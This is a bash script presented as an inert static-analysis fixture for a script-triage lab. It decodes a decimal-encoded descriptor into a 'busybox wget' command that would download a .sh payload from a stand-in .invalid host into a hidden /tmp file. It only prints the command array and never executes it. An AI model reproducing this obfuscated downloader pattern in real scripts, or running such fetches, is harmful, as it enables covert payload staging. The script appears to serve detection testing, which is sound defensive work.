#!/usr/bin/env bash

# Huntress Script Triage -- inert static-analysis fixture (bash_linux)

readonly Material_103aa2fb='118 61 49 124 115 116 101 112 115 61 97 99 113 117 105 114 101 95 114 101 109 111 116 101 44 119 114 105 116 101 95 102 105 108 101 124 97 100 97 112 116 101 114 61 98 117 115 121 98 111 120 95 119 103 101 116 95 111 117 116 112 117 116 124 115 116 97 103 101 95 99 111 117 110 116 61 49 124 99 97 109 112 97 105 103 110 95 105 100 61 99 97 109 112 97 105 103 110 45 54 51 49 52 55 99 101 48 48 51 124 117 114 108 61 104 116 116 112 115 58 47 47 54 51 49 52 55 99 101 48 48 51 46 101 120 97 109 112 108 101 46 105 110 118 97 108 105 100 47 50 56 51 48 99 98 49 98 46 115 104 124 117 115 101 114 95 97 103 101 110 116 61 72 117 110 116 114 101 115 115 76 97 98 47 54 51 49 52 55 99 101 48 48 51 124 102 105 108 101 95 112 97 116 104 61 47 116 109 112 47 104 117 110 116 114 101 115 115 45 99 97 99 104 101 47 46 115 116 97 103 101 45 54 51 49 52 55 99 101 48 48 51'

readonly Codec_103aa2fb='decimal_space|identity|'



Load_103aa2fb() {

  stored_bytes=()

  local IFS=' '

  read -r -a stored_bytes <<< "${Material_103aa2fb}"

}



Decode_103aa2fb() {

  recovered_bytes=()

  local byte_index

  for ((byte_index=0; byte_index<${#stored_bytes[@]}; byte_index++)); do

    recovered_bytes+=("${stored_bytes[byte_index]}")

  done

}



Recover_103aa2fb() {

  local -a stored_bytes recovered_bytes

  local configuration_text harmless_value decode_pass byte_index

  harmless_value=$((19 * 7 - 133))

  Load_103aa2fb

  local decode_target=Decode_103aa2fb; "$decode_target"

  configuration_text=''

  local octal character

  for byte_index in "${!recovered_bytes[@]}"; do

    printf -v octal '%03o' "${recovered_bytes[byte_index]}"

    printf -v character '%b' "\\$octal"

    configuration_text+="$character"

  done

  printf '%s\n' "$configuration_text"

}



Inspect_103aa2fb() { local recovered field; local -a fields; recovered="$(Recover_103aa2fb)"; IFS='|' read -r -a fields <<< "$recovered"; (IFS='|'; printf '%s\n' "${fields[*]}"); }



Plan_103aa2fb() {

  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''

  descriptor="$(Inspect_103aa2fb)"

  local -a fields

  IFS='|' read -r -a fields <<< "$descriptor"

  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done

  local -a request_command=(busybox wget -qO "$file_path" "$url")

  declare -p request_command

}



if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_103aa2fb; fi

